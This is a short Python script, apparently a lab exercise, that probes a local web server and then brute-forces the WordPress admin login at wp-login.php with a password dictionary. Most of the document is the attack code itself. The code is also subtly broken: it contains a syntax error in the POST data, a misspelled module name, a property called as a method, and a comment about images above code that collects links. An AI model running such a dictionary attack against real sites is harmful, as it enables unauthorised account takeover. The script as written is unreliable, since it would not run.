#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

# Check to ensure Target address is up
requests.get("http://127.0.0.1")

# Grab banner from Target to determine OS
req_ = requests.get("http://127.0.0.1")
req_.headers

# Get content of local host homepage
req_.text()

# Print content with BeautifulSoup
soup = BeautifulSoup(req_.text, "html.parser")
print(soup.prettify())

# Title of web portal hosted on local host 
print(soup.title)

# Print URLS for impages present on the homepage
home_ = requests.get("http://localhost")
soup = BeautifulSoup(home_.text, "html.parser")
imgs = soup.find_all("a", href=True)
imgs_href = []

for img in imgs:
    imgs_href.append(img['href'])

imgs_set = set(imgs_href)

for img in imgs_set:
    print(img)

# Attack & Access
word_p = requests.get("http://localhost/wp-admin/")
soup_word_p = BeautifulSoup(word_p.text, "html.parser")
print(soup_word_p.prettify())

# Brute Force user login / dictionary attack with POST request
passfile = "password_dictionary.txt"

with open(passfile, "r") as f:
    for word in f:
        word = word.strip("\n")
        trying_ = request.post("http://localhost/wp-login.php", data=("log": "admin", "pwd": word))

        if "ERROR" not in trying_.text:
            print("Success, the password is: " + word)
            break
        else:
            print("Incorrect password: " + word)
            